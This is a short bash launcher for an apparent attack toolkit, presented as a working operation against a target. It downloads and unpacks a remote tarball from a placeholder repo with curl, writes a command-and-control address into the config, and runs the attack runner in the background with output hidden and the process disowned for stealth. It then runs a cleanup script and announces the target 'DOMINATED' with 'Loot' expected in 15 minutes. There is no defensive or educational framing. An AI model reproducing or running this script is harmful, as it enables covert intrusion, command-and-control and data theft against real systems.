set -euo pipefail
TARGET=${1:?} C2=${2:-"YOUR_C2"}

# 1. Self-update
curl -sSL https://YOUR_REPO/siak_suite.tar.gz | tar xz

# 2. Config
sed -i "s/YOUR_C2/$C2/g" config.yaml

# 3. Stealth launch
nohup python3 runner.py $TARGET > /dev/null 2>&1 &
disown

# 4. Cleanup
./cleanup.sh

echo "[+] SIAK DOMINATED. Monitor: $C2:443"
echo "[+] Loot ETA: 15min"